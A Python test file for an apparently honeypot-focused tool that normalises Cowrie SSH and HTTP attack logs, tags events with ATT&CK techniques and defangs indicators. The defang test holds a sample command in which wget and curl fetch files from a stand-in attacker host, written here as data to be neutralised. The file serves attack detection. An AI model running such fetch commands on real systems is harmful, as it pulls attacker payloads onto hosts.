import json
from pathlib import Path

from honeyjar.config import RULES_DIR
from honeyjar.defang import defang
from honeyjar.normalize import normalize
from honeyjar.rules import RuleEngine
from honeyjar.worker import Enricher

FIXTURES = Path(__file__).parent / "fixtures"


def cowrie_lines():
    return [json.loads(line) | {"honeypot": "cowrie"}
            for line in (FIXTURES / "cowrie.json").read_text().splitlines() if line.strip()]


def test_cowrie_session_is_normalized_and_enriched():
    enricher = Enricher(RuleEngine(RULES_DIR), geo=None)
    events = [e for e in (enricher.enrich(r, "s1") for r in cowrie_lines()) if e]
    types = [e.event_type for e in events]
    assert types == ["connect", "client_info", "login_attempt", "login_attempt", "command", "command",
                     "download", "session_closed"]
    # protocol / port from the connect event are carried onto later events of the session
    assert all(e.proto == "ssh" and e.dst_port == 22 for e in events)
    failed, ok = events[2], events[3]
    assert (failed.username, failed.password, failed.login_success) == ("root", "123456", False)
    assert ok.login_success is True and "T1078" in ok.techniques
    assert "T1082" in events[4].techniques
    assert {"T1105", "T1222.002"} <= set(events[5].techniques)
    assert events[6].payload_hash.startswith("a1b2")


def test_unknown_records_are_dropped():
    assert normalize({"honeypot": "cowrie", "eventid": "cowrie.log.closed", "src_ip": "1.2.3.4"}, "s") is None
    assert normalize({"honeypot": "nope"}, "s") is None
    assert normalize({"honeypot": "http"}, "s") is None


def test_http_record_extracts_credentials():
    raw = {"honeypot": "http", "ts": "2026-10-28T10:00:00Z", "src_ip": "203.0.113.9", "src_port": 51000,
           "dst_port": 80, "method": "POST", "path": "/wp-login.php",
           "headers": {"User-Agent": "Mozilla/5.0"}, "body": "log=admin&pwd=letmein",
           "creds": {"username": "admin", "password": "letmein", "source": "form"}}
    ev = normalize(raw, "s1")
    assert (ev.username, ev.password, ev.http_ua, ev.proto) == ("admin", "letmein", "Mozilla/5.0", "http")


def test_defang():
    assert defang("wget http://1.2.3.4/x; curl https://evil.example/a") == \
        "wget hxxp://1[.]2[.]3[.]4/x; curl hxxps://evil.example/a"
    assert defang(None) is None
